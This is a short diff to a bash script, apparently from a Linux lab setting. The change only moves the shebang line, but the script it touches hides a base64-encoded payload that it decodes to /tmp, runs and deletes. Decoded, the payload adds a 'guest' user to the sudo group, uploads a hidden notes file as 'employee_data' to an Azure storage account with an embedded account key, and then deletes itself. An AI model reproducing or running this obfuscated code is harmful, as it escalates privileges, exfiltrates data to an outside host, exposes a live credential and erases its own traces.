@@ -1,7 +1,8 @@
+#!/bin/bash
+
 a="IyEvYmluL2Jhc2ggIAoKc3VkbyB1c2VybW9kIC1hRyBzdWRvIGd1ZXN0CgpheiBzdG9yYWdlIGJsb2IgdXBsb2FkIFwKICAtLWFjY291bnQtbmFtZSBsaW51eGxhYjY3MDBzdG9yYWdlIFwKICAtLWFjY291bnQta2V5IGh4YlJoa1NGOVcraGN0ejJCQkg1c3ZKcDhFUnV2Mmd0NytWQmoxUFhXUlBTQlhWdGg2ZzBiQlNFeVBBbUwwNVI3Si84c1E2Q25XclUrQVN0dDFrUUJ3PT0gXAogIC0tY29udGFpbmVyLW5hbWUgbGludXhsYWI2NzAwc3RvcmFnZSBcCiAgLS1maWxlIC9ob21lL2xhYnVzZXIxMjMvLkRlc2t0b3AvLm5vdGVzLnR4dCBcCiAgLS1uYW1lIGVtcGxveWVlX2RhdGEKCnJtIC0tICIkMCI="
 
 echo "$a" | base64 -d > /tmp/.payload.sh
 chmod +x /tmp/.payload.sh
 bash /tmp/.payload.sh
 rm /tmp/.payload.sh
-#!/bin/bash
